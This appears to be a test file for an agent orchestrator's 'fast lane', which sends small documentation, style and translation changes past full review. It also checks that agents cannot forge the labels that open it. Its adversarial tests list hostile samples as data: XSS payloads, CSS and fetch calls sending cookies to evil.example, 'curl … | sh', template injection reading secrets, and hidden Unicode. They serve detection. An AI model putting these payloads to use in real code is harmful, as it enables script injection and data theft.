  const holder = spawn('flock', ['-x', `${record}.lock`, process.execPath, '-e', hold]);
  const exited = new Promise((resolve) => holder.on('exit', resolve));
  while (!existsSync(started)) await new Promise((resolve) => setTimeout(resolve, 20));
  const from = Date.now();
  const commit = 'a'.repeat(40);
  const run = spawnSync(process.execPath, [cli, 'tests-done', 'X-1', commit, '0'], { env, encoding: 'utf8' });
  assert.equal(run.status, 0, run.stderr);
  assert.ok(Date.now() - from >= 300, 'the writer waited for the holder of the lock');
  assert.equal(JSON.parse(readFileSync(record, 'utf8')).fast_lane.tests.head, commit);
  await exited;
});

test('the card says what is true: running checks as running, red and not started as such; targeted tests failed or skipped', async () => {
  const b = await board();
  try {
    addEvent(b.db, { kind: 'fast_lane_opened', ticket: 'EX-7', detail: 'dev/EX-7: opened on the fast lane' });
    const line = async (checks: string) => {
      writeFileSync(join(b.dir, 'wake', 'state.json'), JSON.stringify({ pulls: { 314: { state: 'ready', checks, files: 1, additions: 1, deletions: 1 } } }));
      return (await b.collect()).tickets[0]!.statusLine;
    };
    // The wake's words for the checks: pending is running, failure is red, none is not started.
    assert.equal(await line('pending'), 'full checks running, landing when green');
    assert.equal(await line('failure'), 'full checks failed: the ticket goes back to its team');
    assert.equal(await line('none'), 'full checks not started yet, landing when green');
    assert.notEqual(await line('success'), 'full checks running, landing when green', 'green: the lane has nothing to wait for');
    addEvent(b.db, { kind: 'fast_lane_tests', ticket: 'EX-7', detail: JSON.stringify({ head: 'c'.repeat(40), exit: 1 }), value: 1 });
    assert.equal(await line('pending'), 'targeted tests failed at its last commit: not ready to land');
    addEvent(b.db, { kind: 'fast_lane_tests', ticket: 'EX-7', detail: JSON.stringify({ head: 'd'.repeat(40), skipped: true }), value: null });
    assert.equal(await line('pending'), 'targeted tests skipped at its last commit: they could not run');
    const { message } = await import('../lib/i18n.ts');
    for (const key of ['app_srv_fast_checks_red', 'app_srv_fast_checks_not_started', 'app_srv_fast_tests_failed', 'app_srv_fast_tests_skipped']) {
      assert.notEqual(message(key, 'fr'), message(key, 'en'), key);
    }
  } finally { b.close(); }
});

test('the tests of a fast-lane commit can be recorded as skipped, and the record says so', () => {
  const state = scratch('fast-lane-skip-');
  mkdirSync(join(state, 'lanes'), { recursive: true });
  writeFileSync(join(state, 'lanes', 'X-1.json'), JSON.stringify({ ticket: 'X-1', fast_lane: { opening: 'fast', state: 'fast' } }));
  const env = { ...process.env, ORCH_STATE_DIR: state, ORCH_LEDGER: join(state, 'ledger.db') };
  const cli = fileURLToPath(new URL('../lib/fast-lane.ts', import.meta.url));
  const commit = 'b'.repeat(40);
  assert.equal(spawnSync(process.execPath, [cli, 'tests-done', 'X-1', commit, 'skipped'], { env, encoding: 'utf8' }).status, 0);
  const tests = JSON.parse(readFileSync(join(state, 'lanes', 'X-1.json'), 'utf8')).fast_lane.tests;
  assert.deepEqual([tests.head, tests.skipped], [commit, true]);
  assert.notEqual(spawnSync(process.execPath, [cli, 'tests-done', 'X-1', commit, 'nope'], { env, encoding: 'utf8' }).status, 0);
});

test('the example settings and the docs say every fast-lane key, and nothing fast is on by default', () => {
  const example = readFileSync(join(import.meta.dirname, '..', 'agents.example.conf'), 'utf8');
  assert.match(example, /\[fast_lane\]\nenabled = no\n/);
  assert.match(example, /tests_command = npx --no-install vitest related --run --passWithNoTests \{files\}/, 'a change no test relates to passes');
  const prompt = readFileSync(join(import.meta.dirname, '..', 'prompts', 'fast-lane-review.md'), 'utf8');
  assert.doesNotMatch(prompt, /moves the ticket to the full circuit/, 'the reviewer is told what the code does: corrections, same lane');
  assert.match(prompt, /stays on the fast lane/);
  const docs = readFileSync(join(import.meta.dirname, '..', 'docs', 'fast-lane.md'), 'utf8');
  assert.match(docs, /## Threat model: can a risky ticket take the fast lane\?/);
  assert.match(docs, /## What never qualifies/);
  const reference = readFileSync(join(import.meta.dirname, '..', 'docs', 'configuration.md'), 'utf8');
  for (const key of ['file_types', 'extra_file_types', 'trust_label_without_actor']) {
    assert.match(example, new RegExp(`\\n${key} =`), key);
    assert.match(reference, new RegExp(`\\| \`${key}\` \\|`), key);
  }
  // The example's settings are readable, and its file types are the built-in list.
  assert.deepEqual([...fastSettings(parseConf(example)).types], FILE_TYPES);
});

// ---- What lands, not what the branch says: the merge the forge would make ----

test('adversarial: a criss-cross history (two merge bases) is not judged; a merge that conflicts is not either; the base\'s own later changes are not the branch\'s', () => {
  // A at the base; B on the branch, C on main; main merges the branch (D) and the branch merges main (E): two merge bases, B and C.
  const p = project();
  const b = p.commit(({ write: w }) => w({ 'docs/guide.md': 'Hello from the branch\n' }));
  p.git('checkout', '-q', 'main');
  p.git('checkout', '-q', '-b', 'other');
  write(p.dir, { 'docs/other.md': 'other\n' });
  p.git('add', '-A');
  p.git('commit', '-q', '-m', 'C');
  const c = p.git('rev-parse', 'HEAD').trim();
  p.git('checkout', '-q', 'main');
  p.git('merge', '-q', '--no-ff', '-m', 'D', c);
  p.git('merge', '-q', '--no-ff', '-m', 'D2', b);
  p.git('checkout', '-q', 'dev/X-1');
  p.git('merge', '-q', '--no-ff', '-m', 'E', c);
  const e = p.commit(({ write: w }) => w({ 'docs/guide.md': 'Hello again\n' }));
  assert.equal(p.git('merge-base', '--all', 'main', e).trim().split('\n').length, 2, 'the history is criss-cross');
  assert.deepEqual(judge(p, e), { state: 'full', reasons: ['unreadable'], keep: false });
  // A conflict with the base: what would land cannot be known before somebody resolves it.
  const q = project();
  const mine = q.commit(({ write: w }) => w({ 'docs/guide.md': 'Bonjour\n' }));
  q.git('checkout', '-q', 'main');
  write(q.dir, { 'docs/guide.md': 'Hola\n' });
  q.git('commit', '-q', '-am', 'main changed the same line');
  q.git('checkout', '-q', 'dev/X-1');
  assert.deepEqual(judge(q, mine).reasons, ['unreadable']);
  // What the base gained since is not judged as the branch's change: only the tree that lands is.
  const r = project();
  const tiny = r.commit(({ write: w }) => w({ 'docs/guide.md': 'Hello, world\n' }));
  r.git('checkout', '-q', 'main');
  write(r.dir, { 'api/server.js': 'export const x = 3;\n' });
  r.git('commit', '-q', '-am', 'main moved on code');
  r.git('checkout', '-q', 'dev/X-1');
  const judged = judge(r, tiny);
  assert.deepEqual({ state: judged.state, files: judged.files }, { state: 'fast', files: 1 });
  // And a branch that reverts a file to its old version through a merge from the base is judged by what that merge lands.
  const s = project();
  s.git('checkout', '-q', 'main');
  write(s.dir, { 'api/server.js': 'export const x = 4; // the fix\n' });
  s.git('commit', '-q', '-am', 'a fix on main');
  s.git('checkout', '-q', 'dev/X-1');
  s.git('merge', '-q', '--no-ff', '-m', 'bring main in', 'main');
  const undone = s.commit(({ write: w }) => w({ 'api/server.js': 'export const x = 1;\n', 'docs/guide.md': 'Hi\n' }));
  assert.deepEqual(judge(s, undone).reasons, ['outside_safe', 'file_type'], 'the fix undone is seen');
  // Nothing of the merge is written into the checkout's objects.
  const before = s.git('count-objects', '-v');
  judge(s, undone);
  assert.equal(s.git('count-objects', '-v'), before);
});

test('adversarial: a safe file that carries behaviour (markup, a remote load, a template, an escape, a handler, hidden characters) takes the full circuit; plain text stays fast', () => {
  const cases = {
    'web/app.css': [
      'body { background: url(https://evil.example/?c=1); }',
      '@import "https://evil.example/x.css";',
      'input[value^="a"] { background: URL ( //evil.example/a ) }',
      '.consent { content: "\\3c script" }',
      'div { width: expression(alert(1)); }',
      'a { -moz-binding: x; }',
      '@font-face { font-family: x; src: local(x) }',
    ],
    'web/locales/en.json': [
      '{"title": "<img src=x onerror=alert(1)>"}',
      '{"title": "\\u003cimg src=x\\u003e"}',
      '{"title": "&lt;img src=x&gt;"}',
      '{"title": "&#60;script&#62;"}',
      '{"title": "{{constructor.constructor(\'alert(1)\')()}}"}',
      '{"title": "${process.env.SECRET}"}',
      '{"title": "#{7*7}"}',
      '{"title": "{% raw %}"}',
      '{"link": "java\\tscript:alert(1)"}',
      '{"link": "javascript:alert(1)"}',
      '{"link": "data:text/html;base64,PHNjcmlwdD4="}',
      '{"title": "x\\" onmouseover=\\"alert(1)"}',
      '{"title": "Prix‮ 0 €"}',
      '{"title": "Hello​world"}',
      '{"title": "%3Cscript%3E"}',
    ],
    'docs/guide.md': ['Hello <br> world', '[click](javascript:alert(1))', '{{ site.secret }}', '{!../../api/secret.py!}', '!include ../../api/secret.py', '!INCLUDE "../.env"'],
  };
  for (const [file, lines] of Object.entries(cases)) {
    for (const line of lines) {
      const p = project();
      const head = p.commit(({ write: w }) => w({ [file]: `${line}\n` }));
      const judged = judge(p, head);
      assert.equal(judged.state, 'full', `${file}: ${line}`);
      assert.deepEqual(judged.reasons, ['content'], `${file}: ${line}`);
      assert.match(judged.offending!.content!, new RegExp(`^${file.replace(/[.]/g, '\\.')} \\(`));
    }
  }
  // Not UTF-8: not read, not fast.
  const p = project();
  const bytes = p.commit(({ dir }) => writeFileSync(join(dir, 'docs', 'guide.md'), Buffer.from([0x48, 0xc3, 0x28, 0x0a])));
  assert.deepEqual(judge(p, bytes).reasons, ['content']);
  // Only what is gained is read: taking markup out is plain text.
  const q = project({ 'docs/guide.md': 'Hello <b>world</b>\n' });
  const removed = q.commit(({ write: w }) => w({ 'docs/guide.md': 'Hello world\n' }));
  assert.equal(judge(q, removed).state, 'fast');
  // Plain wording, in every kind of safe file, stays fast: quotes, apostrophes, a colon, braces of a message format, an e-mail address.
  const r = project();
  const plain = r.commit(({ write: w }) => w({ 'web/locales/en.json': '{"title": "Don\'t miss: {count} new items", "help": "Write to help@example.com"}\n', 'web/app.css': 'h1 { color: #333; margin: 0 auto; }\n', 'docs/guide.md': 'Prices: see the "Plans" page.\n' }));
  assert.deepEqual(judge(r, plain).reasons, []);
  // The project's own forbidden texts, compared without case.
  const s = project();
  const price = s.commit(({ write: w }) => w({ 'docs/guide.md': 'Le PRIX est de 0 euro\n' }));
  assert.deepEqual(judge(s, price, confOf('enabled = yes\nsafe_paths = docs/\nforbidden_text = prix, tarif')).reasons, ['content']);
  assert.equal(judge(s, price).state, 'fast');
  assert.throws(() => fastSettings(confOf(`enabled = yes\nforbidden_text = ${'x'.repeat(201)}`)), /forbidden_text/);
  // A diff whose lines cannot be read whole leaves the content unread: not fast, whatever the rest says.
  assert.equal(contentFinding(null), 'unread');
  assert.equal(contentFinding(['plain', null]), 'encoding');
  assert.equal(judgeDiff([{ path: 'docs/a.md', status: 'A', oldMode: '000000', newMode: '100644', added: 1, deleted: 0, size: 3 }], fastSettings(CONF)).reasons.includes('content'), true);
});

test('adversarial: a style sheet that loads an image through image-set, image, src, cross-fade, element or paint takes the full circuit; ordinary CSS and prose stay plain', () => {
  const loads = [
    'input[value^="a"]{background:image-set("https://evil.example/a" 1x)}',
    'a{background:-webkit-image-set("https://evil.example/b" 1x)}',
    'a{background:image("https://evil.example/c")}',
    'a{background:src("https://evil.example/d")}',
    'a{background:cross-fade(red, blue)}',
    'a{background:element(#hidden)}',
    'a{background:paint(evil)}',
  ];
  for (const line of loads) {
    const p = project();
    const head = p.commit(({ write: w }) => w({ 'web/app.css': `${line}\n` }));
    const judged = judge(p, head);
    assert.equal(judged.state, 'full', line);
    assert.deepEqual(judged.reasons, ['content'], line);
    assert.match(judged.offending!.content!, /^web\/app\.css \(load\)$/, line);
  }
  assert.equal(contentFinding(['h1 { color: #333; margin: 0 auto; }', 'Choose the image that suits you, then save.']), null);
});

test('adversarial: a hidden character (controls, format marks, line and paragraph separators, invisible fillers, the tag block) takes the full circuit; a tab, a trailing carriage return and plain accents stay plain', () => {
  const hidden = ['\u0001', '\u0085', '­', '؜', '᠎', '​', '‏', '‮', ' ', ' ', '⁠', '⁦', '͏', 'ᅟ', 'ᅠ', '⠀', 'ㅤ', 'ﾠ', '﻿', '︀', '️', '\u{E0001}', '\u{E0041}', '\u{E007F}', '\r'];
  for (const mark of hidden) {
    const line = `Bonjour${mark}le monde`;
    assert.equal(contentFinding([line]), 'hidden', JSON.stringify(line));
    const p = project();
    const head = p.commit(({ write: w }) => w({ 'docs/guide.md': `${line}\n` }));
    assert.deepEqual(judge(p, head).reasons, ['content'], JSON.stringify(line));
  }
  assert.equal(contentFinding(['Où est le café ? Voilà.', 'a\tb', 'une ligne\r']), null);
});

test('adversarial: a link in any form (a scheme and //, a protocol-relative //host, www., mailto:, a Markdown image) takes the full circuit with the reason link; a sentence without one stays plain', () => {
  const links = ['see https://evil.example/x', 'open ftp://evil.example', 'see //evil.example/a', 'go to www.evil.example', 'write mailto:a@evil.example', '![logo](https://evil.example/p.png)', 'an image ![logo](logo.png)'];
  for (const line of links) {
    assert.equal(contentFinding([line]), 'link', line);
    const p = project();
    const head = p.commit(({ write: w }) => w({ 'docs/guide.md': `${line}\n` }));
    const judged = judge(p, head);
    assert.equal(judged.state, 'full', line);
    assert.deepEqual(judged.reasons, ['link'], line);
    assert.match(judged.offending!.link!, /^docs\/guide\.md \(link\)$/, line);
  }
  assert.equal(contentFinding(['Nous répondons par e-mail, du lundi au vendredi.', 'Le site ferme à 18 h.']), null);
});

test('adversarial: fullwidth look-alikes are refused as the ASCII they fold to under NFKC, and the raw line is scanned too', () => {
  const cases = [['＜script＞alert(1)＜/script＞', 'markup'], ['ｊａｖａｓｃｒｉｐｔ:alert(1)', 'load'], ['＜img src=x', 'markup'], ['ｈｔｔｐｓ：／／evil.example', 'link'], ['Price ＜b>', 'markup']];
  for (const [line, finding] of cases) {
    assert.equal(contentFinding([line]), finding, line);
    const p = project();
    const head = p.commit(({ write: w }) => w({ 'web/locales/en.json': `{"title": "${line}"}\n` }));
    assert.deepEqual(judge(p, head).reasons, [finding === 'link' ? 'link' : 'content'], line);
  }
  // Forbidden texts match the folded form too.
  assert.equal(contentFinding(['Ｐｒｉｘ 0 euro'], ['prix']), 'forbidden_text');
  // Fullwidth wording that folds to plain words stays plain.
  assert.equal(contentFinding(['Ｂｏｎｊｏｕｒ, ｍｏｎｄｅ']), null);
});

// ---- Who set the fast label ----

test('label trust: a fast mark counts only when the user set it; a tracker that cannot say gives nothing unless the project opts in, and never against an agent it names', () => {
  const settings = fastSettings(CONF);
  const human = { kind: 'human', id: 'alice' };
  const agents = { kind: 'agents', id: 'cleared[bot]' };
  const issue = { identifier: 'X-1', labels: ['Quick'], project: 'Wording' };
  assert.deepEqual(openingDecision(settings, { ...issue, project: null }, { labels: { Quick: human }, project: null }), { lane: 'fast', ignored: [] });
  // Forged by an agent identity: the lead files follow-ups with [tracker] create_label and create_project.
  const forged = openingDecision(settings, issue, { labels: { Quick: agents }, project: agents });
  assert.equal(forged.lane, 'full');
  assert.deepEqual(forged.ignored, ['label Quick (set by agents)', 'project Wording (set by agents)']);
  assert.equal(openingLane(settings, issue, { labels: { Quick: { kind: 'other', id: 'bob' } }, project: { kind: 'other', id: 'bob' } }), 'full', 'another person is not the user');
  assert.equal(openingLane(settings, issue, { labels: { Quick: agents }, project: human }), 'fast', 'the user put it in a fast project himself');
  // The tracker cannot say who set it: nothing, unless the project opts in; even then, a mark it says an agent set is refused.
  assert.equal(openingLane(settings, issue, null), 'full');
  assert.match(openingDecision(settings, issue, null).ignored[0]!, /the tracker cannot say who set it/);
  const trusting = fastSettings(confOf('enabled = yes\nlabels = Quick\nsafe_paths = docs/\ntrust_label_without_actor = yes'));
  assert.equal(openingLane(trusting, issue, null), 'fast');
  assert.equal(openingLane(trusting, issue, { labels: { Quick: agents }, project: null }), 'full');
});

test('[Linear adapter] label trust: each tracker says who set a label: GitHub by its timeline (an app is never the user), Linear by its history (else the creator, and never a partial history)', () => {
  const issue = { number: 3, labels: [{ name: 'Quick' }, { name: 'Bug' }], user: { login: 'alice', type: 'User' } };
  const timeline = [
    { event: 'labeled', label: { name: 'Quick' }, actor: { login: 'alice', type: 'User' }, created_at: '2026-01-01T00:00:00Z' },
    { event: 'labeled', label: { name: 'Quick' }, actor: { login: 'cleared', type: 'Bot' }, created_at: '2026-01-02T00:00:00Z' },
    { event: 'labeled', label: { name: 'Bug' }, actor: { login: 'alice', type: 'User' }, performed_via_github_app: { slug: 'x' }, created_at: '2026-01-01T00:00:00Z' },
  ];
  const github = new GithubTracker({ conf: { sections: { tracker: { repository: 'o/r', owner_id: 'alice', app_login: 'cleared[bot]' } } },
    api: (path) => (path.endsWith('/timeline?per_page=100') ? timeline : issue) });
  assert.deepEqual(github.labelActors('GH-3'), { labels: { Quick: { kind: 'agents', id: 'cleared[bot]' }, Bug: { kind: 'other', id: 'alice' } }, project: { kind: 'human', id: 'alice' } });

  const box = sandbox();
  copyFileSync(join(import.meta.dirname, '..', 'tracker.ts'), join(box.home, 'tracker.ts'));
  writeFileSync(box.env.ORCH_CONF, readFileSync(box.env.ORCH_CONF, 'utf8').replace('adapter = local', 'adapter = linear\nowner_id = alice'));
  const answer = join(box.home, 'linear-answer.json');
  writeFileSync(join(box.home, 'bin', 'curl'), `#!${process.execPath}
const fs = process.getBuiltinModule('node:fs');
try { fs.readFileSync(0); } catch { /* no input */ }
const answer = ${JSON.stringify(answer)};
try { process.stdout.write(fs.readFileSync(answer)); } catch { process.stderr.write('cat: ' + answer + ': No such file or directory\\n'); process.exitCode = 1; }
`, { mode: 0o755 });
  const node = (at: string, actor: string | null, app: boolean, labels: string[], project: string | null = null) => ({ createdAt: at, actorId: actor, actor: actor ? { id: actor, app } : null, botActor: null, addedLabelIds: labels, toProjectId: project });
  const linear = (history: ReturnType<typeof node>[], { more = false, creator = { id: 'alice', app: false } } = {}) => {
    writeFileSync(answer, JSON.stringify({ data: { viewer: { id: 'key-owner' }, issue: { createdAt: '2026-01-01T00:00:00Z', creator, botActor: null,
      labels: { nodes: [{ id: 'L1', name: 'Quick' }, { id: 'L2', name: 'Bug' }] }, project: { id: 'P1', name: 'Wording' },
      history: { pageInfo: { hasNextPage: more }, nodes: history } } } }));
    const run = spawnSync(join(box.home, 'tracker.ts'), ['label-actors', 'X-5'], { env: { ...box.env, LINEAR_API_KEY: 'k' }, encoding: 'utf8' });
    return run.status === 0 ? JSON.parse(run.stdout) : null;
  };
  // The user added it, then an agent removed and added it again: the agent's.
  assert.deepEqual(linear([node('2026-01-03T00:00:00Z', 'bot', true, ['L1']), node('2026-01-02T00:00:00Z', 'alice', false, ['L1'], 'P1')]),
    { labels: { Quick: { kind: 'agents', id: 'bot' }, Bug: { kind: 'human', id: 'alice' } }, project: { kind: 'human', id: 'alice' } });
  // Set when an agent created the ticket: the creator's.
  assert.deepEqual(linear([], { creator: { id: 'bot', app: true } }).labels.Quick, { kind: 'agents', id: 'bot' });
  // A history longer than one page is not read in part.
  assert.equal(linear([node('2026-01-02T00:00:00Z', 'alice', false, ['L1'])], { more: true }), null);

  // The local tracker sets labels only at creation: its creator, as its signed history says (an unsigned "human" is nobody).
  const db = openLedger(join(scratch('fast-lane-local-'), 'ledger.db'));
  const conf = { sections: { tracker: { todo_state: 'Todo', owner_id: 'alice' } } };
  const byAgent = new LocalTracker({ conf, db, actor: { kind: 'agents', id: 'agent' } }).createTicket({ title: 'Follow-up', labels: ['Quick'], project: 'Wording' });
  const byHuman = new LocalTracker({ conf, db, actor: { kind: 'human', id: 'alice' } });
  const reader = new LocalTracker({ conf, db, actor: { kind: 'shared', id: 'service' } });
  assert.deepEqual(reader.labelActors(byAgent!.identifier), { labels: { Quick: { kind: 'agents', id: 'agent' } }, project: { kind: 'agents', id: 'agent' } });
  let unsigned;
  try { unsigned = byHuman.createTicket({ title: 'Mine', labels: ['Quick'] }); } catch { unsigned = null; }
  if (unsigned) assert.equal(reader.labelActors(unsigned.identifier).labels.Quick!.kind, 'other', 'no signature that holds: not the user');
  db.close();
});

// ---- The file types the fast lane takes ----

const DOCS = confOf('enabled = yes\nsafe_paths = docs/');

test('adversarial: code in the safe paths takes the full circuit by its type: a script, a page script, a Python file, an MDX page', () => {
  const cases = [
    ['docs/build.sh', 'curl -s evil.example/x | sh', ['file_type']],
    ['docs/scripts/theme.js', "fetch('//evil.example/?c='+document.cookie)", ['file_type', 'link']],
    ['docs/deploy.py', "os.system('id')", ['file_type']],
    ['docs/post.mdx', 'import X from "../../api/secret"', ['file_type']],
    ['docs/post.mdx', '{process.env.SECRET}', ['file_type']],
  ] as [string, string, string[]][];
  for (const [file, line, reasons] of cases) {
    const p = project();
    const head = p.commit(({ write: w }) => w({ [file]: `${line}\n` }));
    const judged = judge(p, head, DOCS);
    assert.equal(judged.state, 'full', `${file}: ${line}`);
    assert.deepEqual(judged.reasons, reasons, `${file}: ${line}`);
    assert.equal(judged.offending!.file_type, file);
  }
  // The same words in a Markdown page pass the type rule; the content rule still reads them (and a link is refused there).
  const p = project();
  const prose = p.commit(({ write: w }) => w({ 'docs/build.md': 'Run the build, then os.system is not called.\n' }));
  assert.deepEqual(judge(p, prose, DOCS).reasons, []);
});

test('adversarial: extension tricks take the full circuit: none, double, case, trailing dot or space, dotfiles, unicode look-alikes, code and markup types, configuration names', () => {
  const refused = ['docs/build', 'docs/hooks/pre-commit', 'docs/x.md.sh', 'docs/notes.sh.md', 'docs/x.PHP.md', 'docs/x.php.txt', 'docs/README.MD', 'docs/x.Sh', 'docs/x.Md', 'docs/x.md.',
    'docs/a..md', 'docs/.md', 'docs/.theme.css', 'docs/x.html', 'docs/x.htm', 'docs/x.svg', 'docs/x.xml', 'docs/x.yml', 'docs/x.yaml', 'docs/x.ts', 'docs/x.mjs', 'docs/x.cjs',
    'docs/x.jsx', 'docs/x.tsx', 'docs/x.vue', 'docs/x.rst', 'docs/x.csv', 'docs/x.toml', 'docs/x.njk', 'docs/x.liquid', 'docs/x.scss', 'docs/x.json5', 'docs/tsconfig.json',
    'docs/tsconfig.build.json', 'docs/site.config.json', 'docs/vercel.json', 'docs/manifest.json', 'docs/robots.txt', 'docs/CMakeLists.txt', 'docs/x.lock'];
  const unicode = ['docs/x.ｍｄ', 'docs/x.mԁ', 'docs/x.md​', 'docs/x.md ', 'docs/x.md ', 'docs/x․md', 'docs/x.ꜱh'];
  for (const file of [...refused, ...unicode]) assert.equal(fileTypeOk(file, new Set(FILE_TYPES)), false, JSON.stringify(file));
  for (const file of refused) {
    const p = project();
    const head = p.commit(({ write: w }) => w({ [file]: 'text\n' }));
    const judged = judge(p, head, DOCS);
    assert.equal(judged.state, 'full', file);
    assert.ok(judged.reasons.includes('file_type') || (file === 'docs/.md' || file === 'docs/.theme.css'), `${file}: ${judged.reasons}`);
  }
  // A dotfile is not even in the safe paths ("docs/" holds none); named there, the type rule still refuses it.
  const dotted = project();
  const theme = dotted.commit(({ write: w }) => w({ 'docs/.theme.css': 'h1 { color: red; }\n' }));
  assert.deepEqual(judge(dotted, theme, confOf('enabled = yes\nsafe_paths = docs/, docs/.*')).reasons, ['file_type']);
  // A name git keeps as bytes the rules cannot read is the full circuit too, by its form or its type.
  for (const file of unicode) {
    const p = project();
    const head = p.commit(({ write: w }) => w({ [file]: 'text\n' }));
    const judged = judge(p, head, DOCS);
    assert.equal(judged.state, 'full', JSON.stringify(file));
    assert.ok(judged.reasons.includes('path_form') || judged.reasons.includes('file_type'), `${JSON.stringify(file)}: ${judged.reasons}`);
  }
  // Prose, styles and translations stay fast, with a locale or a module part in the name.
  const allowed = ['docs/a.md', 'docs/b.markdown', 'docs/c.txt', 'docs/d.css', 'docs/e.json', 'docs/f.po', 'docs/guide.fr.md', 'docs/Button.module.css', 'docs/messages.pt-BR.json'];
  for (const file of allowed) assert.equal(fileTypeOk(file, new Set(FILE_TYPES)), true, file);
  const p = project();
  const plain = p.commit(({ write: w }) => w(Object.fromEntries(allowed.slice(0, 6).map((file) => [file, 'Hello\n']))));
  assert.deepEqual(judge(p, plain, confOf('enabled = yes\nsafe_paths = docs/\nmax_files = 10')).reasons, []);
});

test('the file types can be narrowed; widened only by extra_file_types, never to a type that runs; lock files, manifests, git files and hooks stay refused whatever the types', () => {
  assert.deepEqual(FILE_TYPES, ['md', 'markdown', 'txt', 'css', 'json', 'po']);
  for (const type of FILE_TYPES) assert.equal(CODE_TYPES.has(type), false, type);
  const p = project();
  const text = p.commit(({ write: w }) => w({ 'docs/notes.txt': 'Hello\n' }));
  // Narrowed: prose in Markdown only.
  assert.deepEqual(judge(p, text, confOf('enabled = yes\nsafe_paths = docs/\nfile_types = md, markdown')).reasons, ['file_type']);
  // file_types never widens: a type outside the built-in list refuses the settings, and nothing is fast.
  for (const narrow of ['sh', 'csv', 'md, js', '.md', 'MD']) {
    const conf = confOf(`enabled = yes\nsafe_paths = docs/\nfile_types = ${narrow}`);
    assert.throws(() => fastSettings(conf), /\[fast_lane\]/, narrow);
    assert.deepEqual(judge(p, text, conf).reasons, ['settings'], narrow);
  }
  // extra_file_types widens, explicitly, but never to a type that runs, is interpreted or configures something.
  const q = project();
  const table = q.commit(({ write: w }) => w({ 'docs/prices.csv': 'name,price\nTea,3\n' }));
  assert.deepEqual(judge(q, table, DOCS).reasons, ['file_type']);
  assert.deepEqual(judge(q, table, confOf('enabled = yes\nsafe_paths = docs/\nextra_file_types = csv')).reasons, []);
  for (const extra of ['sh', 'js', 'mjs', 'ts', 'jsx', 'py', 'mdx', 'html', 'svg', 'xml', 'yml', 'yaml', 'rst', 'toml', 'php', 'csv, Sh', 'md.sh', '']) {
    const conf = confOf(`enabled = yes\nsafe_paths = docs/\nextra_file_types = ${extra}`);
    if (extra === '') { assert.equal(fastSettings(conf).types.size, FILE_TYPES.length); continue; }
    assert.throws(() => fastSettings(conf), /extra_file_types|not a file type/, extra);
  }
  // Whatever the types, the built-in lists still refuse lock files, manifests, git files and hooks.
  const wide = confOf('enabled = yes\nsafe_paths = **, .*, .husky/*, .git*\nmax_lines = 400\nmax_files = 50\nextra_file_types = csv, lockfile');
  for (const [file, reason] of [['package.json', 'dependency'], ['web/composer.json', 'dependency'], ['yarn.lock', 'dependency'], ['deps.lockfile', 'dependency'],
    ['.gitattributes', 'protected'], ['docs/.gitmodules', 'protected'], ['.husky/pre-commit', 'protected'], ['.githooks/pre-push', 'protected'], ['requirements.txt', 'dependency']] as [string, string][]) {
    const one = project();
    const changed = one.commit(({ write: w }) => w({ [file]: 'changed\n' }));
    const judged = judge(one, changed, wide);
    assert.equal(judged.state, 'full', file);
    assert.ok(judged.reasons.includes(reason), `${file}: ${judged.reasons}`);
  }
  // The card says it in words, in both languages.
  return import('../lib/i18n.ts').then(({ message }) => {
    assert.match(message('app_srv_fast_reason_file_type', 'en'), /type the fast lane does not take/);
    assert.match(message('app_srv_fast_reason_file_type', 'fr'), /type que la voie rapide ne prend pas/);
  });
});

// ---- A tracker that cannot tell the user from an agent ----

test('shared identity at opening: under the user\'s own key a label he seems to have set is ignored, unless the owner said separate_identity = no or opted in; an application tells them apart; an agent\'s label is never taken', () => {
  const human = { kind: 'human', id: 'alice' };
  const agents = { kind: 'agents', id: 'cleared[bot]' };
  const issue = { identifier: 'X-1', labels: ['Quick'], project: null };
  const confWith = (merge: string, fast = '') => parseConf(`[merge]\n${merge}\n[fast_lane]\nenabled = yes\nlabels = Quick\nsafe_paths = docs/\n${fast}\n`);
  const open = (conf: Conf, identity: string, by: Actor) => {
    let asked = 0;
    const decision = openingFor(conf, fastSettings(conf), issue, { identity: () => { asked += 1; return identity; }, actorsOf: () => ({ labels: { Quick: by }, project: null }) });
    return { ...decision, asked };
  };
  const required = confWith('separate_identity = required');
  // The merge's own rule, read the same way.
  assert.equal(sharedIdentity(required, 'app'), false);
  assert.equal(sharedIdentity(required, 'shared'), true);
  assert.equal(sharedIdentity(required, 'unknown'), true, 'an identity that cannot be read is not an application');
  assert.equal(sharedIdentity(confWith(''), 'shared'), true, 'unset is required');
  assert.equal(sharedIdentity(confWith('separate_identity = no'), 'shared'), false);
  // Shared key: the label is ignored, and said.
  const shared = open(required, 'shared', human);
  assert.equal(shared.lane, 'full');
  assert.match(shared.ignored[0]!, /^label Quick \(set under the key the agents share with the user: the tracker cannot say who set it/);
  assert.equal(open(required, 'unknown', human).lane, 'full');
  // An application of the agents: the user's label is his.
  assert.deepEqual(open(required, 'app', human), { lane: 'fast', ignored: [], asked: 1 });
  // The owner accepts a shared key ([merge] separate_identity = no), as the merge does: the label is taken as the tracker says.
  assert.equal(open(confWith('separate_identity = no'), 'shared', human).lane, 'fast');
  // Opted in to marks nobody can attribute: taken.
  assert.equal(open(confWith('separate_identity = required', 'trust_label_without_actor = yes'), 'shared', human).lane, 'fast');
  // An agent's label is never taken: with an application, under a shared key, opted in or with separate_identity = no.
  for (const [conf, identity] of [[required, 'app'], [required, 'shared'], [confWith('separate_identity = required', 'trust_label_without_actor = yes'), 'shared'],
    [confWith('separate_identity = required', 'trust_label_without_actor = yes'), 'app'], [confWith('separate_identity = no', 'trust_label_without_actor = yes'), 'shared']] as [Conf, string][]) {
    const forged = open(conf, identity, agents);
    assert.equal(forged.lane, 'full', identity);
    assert.match(forged.ignored[0]!, /set by agents/);
  }
  // A ticket with no fast mark asks the tracker nothing.
  const conf = required;
  let asked = 0;
  assert.deepEqual(openingFor(conf, fastSettings(conf), { identifier: 'X-1', labels: ['Bug'] }, { identity: () => { asked += 1; return 'app'; }, actorsOf: () => { asked += 1; return null; } }), { lane: 'full', ignored: [] });
  assert.equal(asked, 0);
});
